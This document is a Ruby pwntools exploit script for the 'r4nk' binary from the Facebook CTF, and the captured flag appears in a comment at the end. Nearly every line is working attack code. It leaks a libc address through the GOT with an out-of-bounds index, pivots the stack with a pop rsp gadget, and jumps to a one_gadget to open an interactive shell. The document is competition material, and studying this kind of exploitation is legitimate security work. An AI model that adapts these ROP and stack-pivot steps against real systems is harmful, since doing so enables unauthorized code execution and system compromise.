#!/usr/bin/env ruby
# encoding: ascii-8bit
require 'pry'
require 'pwn'        # https://github.com/peter50216/pwntools-ruby
require 'heapinfo'   # https://github.com/david942j/heapinfo

host, port = 'challenges.fbctf.com', 1339
@local = false
if ARGV.empty?
  host = '127.0.0.1'; @local = true
  $z = Tubes::Process.new('./r4nk')
else
  raise ArgumentError, 'host not set' if host.empty?
  $z = Sock.new host, port
end
def z;$z;end
@p = 'r4nk'
def h;@h ||= heapinfo(@p);end
def elf; @elf ||= ELF.new(@p); end
def debug!; context.log_level = :debug; end
#================= Exploit Start ====================
context.arch = :amd64
# debug!

def set(idx, val)
  z.gets '> '
  z.write('2'.ljust(128, "\x00"))
  z.write(idx.to_s.ljust(128, "\x00"))
  z.write(val.to_s.ljust(128, "\x00"))
end

def leak(addr)
  set(0, 31)
  z.gets '> '
  z.write('1'.ljust(120, "\x00") + flat(addr))
  z.gets '0. '
end

leak(elf.got['write'])
libc = ELF.new('../libc-2.27.so')
libc.address = (z.readn(6) + "\x00\x00").u64 - 0x110140
h.offset(libc.address)
log.dump libc.address.hex

pop_rsp_r13 = 0x0000000000400980
stk = 0x602140 - 8
rop = [
  pop_rsp_r13,
  stk
]
rop.each_with_index do |v, i|
  set(17 + i, v)
end

rop2 = [
  libc.one_gadgets[1]
]
z.gets '> '
z.write('3'.ljust(0x40, "\x00") + flat(rop2))

z.interact

# fb{wH0_n33ds_pop_rdx_4NYw4y}
